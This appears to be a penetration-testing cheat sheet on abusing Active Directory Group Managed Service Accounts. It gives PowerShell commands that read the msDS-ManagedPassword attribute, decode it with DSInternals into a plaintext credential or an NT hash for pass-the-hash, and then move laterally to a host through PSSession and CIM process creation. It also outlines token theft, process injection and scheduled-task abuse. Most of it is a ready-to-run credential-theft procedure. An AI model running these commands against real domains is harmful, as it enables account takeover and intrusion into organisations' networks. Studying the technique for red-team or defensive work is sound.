### Abusing the Ability to Read GMSA Passwords

#### Overview
There are several ways to abuse the ability to read the Group Managed Service Account (gMSA) password. These methods exploit the intended behavior of gMSAs when they are logged on to computers or when you have access to their credentials. Below is a professional, streamlined cheat sheet outlining these methods and their execution.

---

### Abuse Scenarios

#### 1. GMSA Logged On to a Computer
- **Description**: If the gMSA is currently logged on to a computer account with permission to retrieve its password:
  - **Action**: Steal the token from the process running as the gMSA.
  - **Alternative**: Inject into the process running as the gMSA.

#### 2. GMSA Not Logged On to a Computer
- **Description**: If the gMSA is not logged on to a computer:
  - **Action**: Create a scheduled task or service to run as the gMSA.
  - **Execution**: The computer account will start the task or service as the gMSA, allowing you to abuse the gMSA logon in the same manner as a standard user.
  - **Reference**: See the "HasSession" help modal for additional details on this technique.

---

### Methods to Retrieve gMSA Passwords

#### **Using Active Directory and DSInternals PowerShell Modules**

1. Save the gMSA password blob to a variable:
   ```powershell
   $gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
   $mp = $gmsa.'msDS-ManagedPassword'
   ```

2. Decode the data structure using the DSInternals module:
   ```powershell
   ConvertFrom-ADManagedPasswordBlob $mp
   ```

3. Build an NT-Hash for Pass-the-Hash (PTH):
   ```powershell
   (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
   ```

4. Alternatively, create a Credential Object with the plain password:
   ```powershell
   $cred = New-Object System.Management.Automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
   ```

---

### Using Credentials

#### **Option 1: Create a New Session**
1. Start a new session:
   ```powershell
   $session = New-PSSession -ComputerName 192.168.50.73 -Credential $cred
   ```

2. Enter the session:
   ```powershell
   Enter-PSSession -Session $session
   ```

3. Run commands remotely:
   ```powershell
   Invoke-Command -Session $session -ScriptBlock { whoami; hostname }
   ```

#### **Option 2: Run Commands via CIM**
1. Build the command:
   ```powershell
   $Command = 'whoami'
   Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}
   ```
